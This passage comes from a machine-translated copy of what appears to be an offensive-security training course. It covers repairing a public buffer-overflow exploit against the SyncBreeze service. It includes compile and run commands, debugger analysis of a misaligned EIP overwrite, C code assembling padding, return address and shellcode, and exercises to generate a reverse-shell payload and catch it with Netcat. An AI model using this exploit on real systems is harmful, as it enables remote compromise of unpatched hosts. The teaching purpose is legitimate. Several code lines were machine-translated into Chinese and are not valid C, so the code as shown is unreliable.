<div style="position:absolute;top:26660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:26694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int main() {</font></font></nobr></div>
<div style="position:absolute;top:26728;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EvilRequest();</font></font></nobr></div>
<div style="position:absolute;top:26745;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回0；</font></font></nobr></div>
<div style="position:absolute;top:26762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:26781;left:151"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 437 - 在套接字信息、返回地址指令和有效负载更改之后利用代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mingw-64</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译漏洞利用代码</font><font style="vertical-align: inherit;">，看看它是否会产生任何错误：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/Desktop$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</font></font></font></b></nobr></div>
<div style="position:absolute;top:26879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/桌面$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lah</font></font></font></b></nobr></div>
<div style="position:absolute;top:26897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总计 372K</font></font></nobr></div>
<div style="position:absolute;top:26914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 2 kali kali 4.0K 2 月 24 日 17:14。</font></font></nobr></div>
<div style="position:absolute;top:26931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 17 kali kali 4.0K 2 月 24 日 15:42 ..</font></font></nobr></div>
<div style="position:absolute;top:26947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 kali kali 4.7K 2 月 24 日 15:46 42341.c</font></font></nobr></div>
<div style="position:absolute;top:26964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 kali kali 355K Feb 24 17:14 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">syncbreeze_exploit.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:26984;left:271"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 438 - 使用 mingw-64 编译修改后的漏洞利用代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了一个更新的、干净的编译漏洞，我们可以测试它。</font><font style="vertical-align: inherit;">我们将附上我们的</font></font></nobr></div>
<div style="position:absolute;top:27032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试器到我们沙盒测试目标上的 SyncBreeze 服务，并在</font></font></nobr></div>
<div style="position:absolute;top:27052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 JMP ESP 指令的内存地址： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:27499;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="24"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 24 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:27532;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:28609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:28609;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:28609;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">465</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:28175;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 261：在我们的 JMP ESP 地址设置断点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们在调试器中设置了断点，我们就可以让应用程序正常运行并</font></font></nobr></div>
<div style="position:absolute;top:28225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试从 Kali Linux 执行我们的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:28258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为这个二进制文件被交叉编译为在 Windows 上运行，我们不能简单地从我们的 Kali 运行它</font></font></nobr></div>
<div style="position:absolute;top:28278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux机器。</font><font style="vertical-align: inherit;">为了运行此Windows二进制文件，我们会用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">酒</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">385</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个兼容性</font></font></nobr></div>
<div style="position:absolute;top:28297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够在 Linux、BSD 等多种操作系统上运行 Windows 应用程序的层</font></font></nobr></div>
<div style="position:absolute;top:28316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 MacOS：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:28351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/Desktop$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wine syncbreeze_exploit.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:28385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 初始化 Winsock...</font></font></nobr></div>
<div style="position:absolute;top:28402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 初始化。</font></font></nobr></div>
<div style="position:absolute;top:28419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 套接字已创建。</font></font></nobr></div>
<div style="position:absolute;top:28436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 已连接</font></font></nobr></div>
<div style="position:absolute;top:28470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 请求已发送</font></font></nobr></div>
<div style="position:absolute;top:28489;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 439 - 使用 wine 运行 Windows 漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:28559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">385 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(WineHQ, 2019), https://www.winehq.org/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:28687;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="25"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 25 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28720;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:29797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:29797;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:29797;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">466</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令人惊讶的是，我们根本没有达到断点。</font><font style="vertical-align: inherit;">相反，应用程序崩溃并且 EIP 注册</font></font></nobr></div>
<div style="position:absolute;top:28835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎被</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x9010090c</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">覆盖</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:29394;left:187"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 262：EIP 被我们的返回地址指令地址覆盖了一个字节未对齐的地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过分析存储在 EIP ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x9010090c</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 中</font><font style="vertical-align: inherit;">的值</font><font style="vertical-align: inherit;">和发送到目标应用程序的缓冲区，</font></font></nobr></div>
<div style="position:absolute;top:29445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们注意到覆盖堆栈上返回地址的偏移量似乎偏离了一个字节。</font></font></nobr></div>
<div style="position:absolute;top:29464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的偏移量迫使 CPU 从堆栈中弹出一个不同的返回地址，而不是</font></font></nobr></div>
<div style="position:absolute;top:29483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预期之一，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x10090c83</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29518;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.6.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 msfvenom 生成反向 shell payload，同时考虑到不好的</font></font></nobr></div>
<div style="position:absolute;top:29567;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们利用的特征。</font></font></nobr></div>
<div style="position:absolute;top:29596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.用新生成的payload替换原来的payload。</font></font></nobr></div>
<div style="position:absolute;top:29624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.将调试器附加到目标进程并在返回地址处设置断点</font></font></nobr></div>
<div style="position:absolute;top:29643;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作说明。</font></font></nobr></div>
<div style="position:absolute;top:29672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 编译漏洞并运行它。</font><font style="vertical-align: inherit;">你打断点了吗？</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:29875;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="26"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 26 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:29908;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:30985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:30985;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:30985;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">467</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:30004;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.1.7</font></font></i></nobr></div>
<div style="position:absolute;top:30004;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改溢出缓冲区</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们试着理解我们的错位。</font><font style="vertical-align: inherit;">看看我们的大填充缓冲区的第一部分在哪里</font></font></nobr></div>
<div style="position:absolute;top:30061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建了一个“A”字符，我们注意到它以调用</font><font style="vertical-align: inherit;">大小为 780 的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">malloc </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">386</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int initial_buffer_size = 780;</font></font></nobr></div>
<div style="position:absolute;top:30113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char *padding = malloc(initial_buffer_size);</font></font></nobr></div>
<div style="position:absolute;top:30132;left:273"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 440 - 使用 malloc 为初始缓冲区分配内存</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个数字对你来说应该很熟悉。</font><font style="vertical-align: inherit;">如果你还记得，从我们在 Windows 期间的研究中</font></font></nobr></div>
<div style="position:absolute;top:30181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区溢出模块，我们确定 780 是覆盖所需的字节偏移量</font></font></nobr></div>
<div style="position:absolute;top:30200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回堆栈上的地址并控制 EIP 寄存器。</font></font></nobr></div>
<div style="position:absolute;top:30233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所述</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的malloc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数只分配基于所请求的大小的存储块。</font><font style="vertical-align: inherit;">这个缓冲区</font></font></nobr></div>
<div style="position:absolute;top:30253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要正确初始化，这是</font><font style="vertical-align: inherit;">在调用后立即</font><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">387</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数完成的</font></font></nobr></div>
<div style="position:absolute;top:30272;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存分配</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset（填充，0x41，initial_buffer_size）；</font></font></nobr></div>
<div style="position:absolute;top:30326;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 441 - 用“A”字符填充初始缓冲区</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font><font style="vertical-align: inherit;">使用</font><font style="vertical-align: inherit;">特定字符填充内存分配，在我们的例子中是</font></font></nobr></div>
<div style="position:absolute;top:30375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x41，ASCII 中“A”字符的十六进制表示。</font></font></nobr></div>
<div style="position:absolute;top:30408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用中的下一行代码很有趣。</font><font style="vertical-align: inherit;">有一个对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的调用</font><font style="vertical-align: inherit;">，它设置了最后一个字节</font></font></nobr></div>
<div style="position:absolute;top:30427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在分配给 NULL 字节时：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset(padding + initial_buffer_size - 1, 0x00, 1);</font></font></nobr></div>
<div style="position:absolute;top:30481;left:187"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 442 - Memset 将最后一个字节设置为空终止符以将缓冲区转换为字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">起初这可能看起来令人困惑，但是，继续阅读代码，我们到达了以下几行</font></font></nobr></div>
<div style="position:absolute;top:30530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建</font><font style="vertical-align: inherit;">最终</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char *buffer = malloc(buffer_length);</font></font></nobr></div>
<div style="position:absolute;top:30582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存集（缓冲区，0x00，缓冲区长度）；</font></font></nobr></div>
<div style="position:absolute;top:30599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy（缓冲区，request_one）；</font></font></nobr></div>
<div style="position:absolute;top:30616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，content_length_string）；</font></font></nobr></div>
<div style="position:absolute;top:30633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，request_two）；</font></font></nobr></div>
<div style="position:absolute;top:30650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，填充）；</font></font></nobr></div>
<div style="position:absolute;top:30667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，retn）；</font></font></nobr></div>
<div style="position:absolute;top:30684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，shellcode）；</font></font></nobr></div>
<div style="position:absolute;top:30701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat（缓冲区，request_three）；</font></font></nobr></div>
<div style="position:absolute;top:30720;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 443 - 创建漏洞利用的最终缓冲区</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码首先</font><font style="vertical-align: inherit;">使用</font><i><font style="vertical-align: inherit;">malloc</font></i><font style="vertical-align: inherit;">和填充</font><font style="vertical-align: inherit;">为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符数组</font><font style="vertical-align: inherit;">分配内存块</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:30769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有 NULL 字节的数组。</font><font style="vertical-align: inherit;">接下来，代码</font><font style="vertical-align: inherit;">通过复制内容来</font><font style="vertical-align: inherit;">填充</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符数组</font></font></nobr></div>
<div style="position:absolute;top:30788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他变量通过各种字符串操作函数，如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">388</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:30875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">386 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（cplusplus，2019），http://www.cplusplus.com/reference/cstdlib/malloc/</font></font></font></nobr></div>
<div style="position:absolute;top:30895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">387 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（cplusplus，2019），http://www.cplusplus.com/reference/cstring/memset/</font></font></font></nobr></div>
<div style="position:absolute;top:30915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">388 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（cplusplus，2019），http://www.cplusplus.com/reference/cstring/strcpy/</font></font></font></nobr></div>
<div style="position:absolute;top:30935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（cplusplus，2019），http://www.cplusplus.com/reference/cstring/strcat/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:31063;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="27"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 27 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:31096;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:32173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:32173;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:32173;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">468</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将最终缓冲区构造为字符串是一条非常重要的信息。</font><font style="vertical-align: inherit;">C</font></font></nobr></div>
<div style="position:absolute;top:31211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编程语言使用以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">空字符结尾的字符串</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">390</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意味着诸如</font></font></nobr></div>
<div style="position:absolute;top:31230;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过搜索第一次出现的字符串来确定字符串的结尾和大小</font></font></nobr></div>
<div style="position:absolute;top:31250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标字符数组中的 NULL 字节。</font><font style="vertical-align: inherit;">由于我们初始</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font><font style="vertical-align: inherit;">的分配大小</font><font style="vertical-align: inherit;">是</font></font></nobr></div>
<div style="position:absolute;top:31269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">780，通过将最后一个字节设置为 0x00（清单 442），我们最终连接 (strcat) 一个字符串“A”</font></font></nobr></div>
<div style="position:absolute;top:31288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">长度为 779 字节的 ASCII 字符。</font><font style="vertical-align: inherit;">这解释了 EIP 的未对齐覆盖</font></font></nobr></div>
<div style="position:absolute;top:31308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登记。</font></font></nobr></div>
<div style="position:absolute;top:31340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过增加由</font><i><font style="vertical-align: inherit;">initial_buffer_size</font></i><font style="vertical-align: inherit;">定义的请求内存大小来快速解决这个问题</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:31360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量为 1。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:31395;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int initial_buffer_size = 781;</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:31412;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">char *padding = malloc(initial_buffer_size);</font></font></nobr></div>
<div style="position:absolute;top:31429;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset（填充，0x41，initial_buffer_size）；</font></font></nobr></div>
<div style="position:absolute;top:31446;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset(padding + initial_buffer_size - 1, 0x00, 1);</font></font></nobr></div>
<div style="position:absolute;top:31465;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 444 - 更改填充分配大小</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为最后的测试，我们将再次编译代码，在端口 443 上设置一个 Netcat 侦听器来捕获我们的</font></font></nobr></div>
